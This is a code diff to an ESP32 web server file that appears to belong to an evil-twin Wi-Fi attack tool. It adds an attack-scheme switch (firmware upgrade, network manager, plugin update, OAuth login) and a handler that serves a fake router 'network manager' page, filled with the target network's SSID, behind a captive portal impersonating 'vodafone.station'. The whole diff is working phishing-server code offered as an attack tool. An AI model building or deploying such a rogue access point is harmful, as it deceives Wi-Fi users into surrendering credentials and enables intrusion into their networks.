@@ -19,14 +19,38 @@
 
 #include "esp_http_server.h"
 
-#include "web_page.h"
+#include "web/web_page.h"
+#include "web/web_net_manager.h"
 #include "server.h"
+#include "evil_twin.h"
 
+#define CHUNK_SIZE 512
 
 static const char *TAG = "HTTPD";	//TAG for debug
 static const char *host = "vodafone.station";
 static const char *captive_portal_url = "http://192.168.4.1/captive_portal";
 static httpd_handle_t server = NULL;
+static target_info_t target = { 0 };
+
+
+static void web_net_manager_scheme(httpd_req_t *req)
+{
+	httpd_resp_set_type(req, "text/html");
+	httpd_resp_send_chunk(req, fake_web_base_network_manager0, sizeof(fake_web_base_network_manager0));
+	httpd_resp_send_chunk(req, (char *)&target.ssid, strlen((char *)&target.ssid));
+
+	size_t bytes_remaining = sizeof(fake_web_base_network_manager);
+    size_t offset = 0;
+    while (bytes_remaining > 0) 
+	{
+        size_t chunk_size = (bytes_remaining > CHUNK_SIZE) ? CHUNK_SIZE : bytes_remaining;
+        httpd_resp_send_chunk(req, fake_web_base_network_manager + offset, chunk_size);
+        offset += chunk_size;
+        bytes_remaining -= chunk_size;
+    }
+
+	httpd_resp_send(req, NULL, 0);
+}
 
 
 static void captive_portal_redirect(httpd_req_t *req)
@@ -34,8 +58,25 @@ static void captive_portal_redirect(httpd_req_t *req)
 	/* Check if we is know page request */
 	if( strcmp(req->uri, "/captive_portal") == 0 )
 	{
-		httpd_resp_set_type(req, "text/html");
-		httpd_resp_send(req, HTML_PAGE, HTTPD_RESP_USE_STRLEN);
+		printf("Attack: %d\n", target.attack_scheme);
+		switch(target.attack_scheme)
+		{
+			case FIRMWARE_UPGRADE:
+				break;
+			
+			case WEB_NET_MANAGER:
+				web_net_manager_scheme(req);
+				break;
+
+			case PLUGIN_UPDATE:
+				break;
+
+			case OAUTH_LOGIN:
+				break;
+
+			default:
+				break;
+		}
 		return;
 	}
 	/* Activate captive portal */
@@ -87,13 +128,16 @@ static esp_err_t redirect_handler(httpd_req_t *req)
 }
 
 
-void http_attack_server_start(void)
+void http_attack_server_start(target_info_t *_target_info)
 {
 	if( server != NULL )
 	{
 		ESP_LOGE(TAG, "Attack server already started.");
 		return;
 	}
+
+	/* Copy target info */
+	memcpy(&target, _target_info, sizeof(target_info_t));
 
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
 	config.ctrl_port = 81;
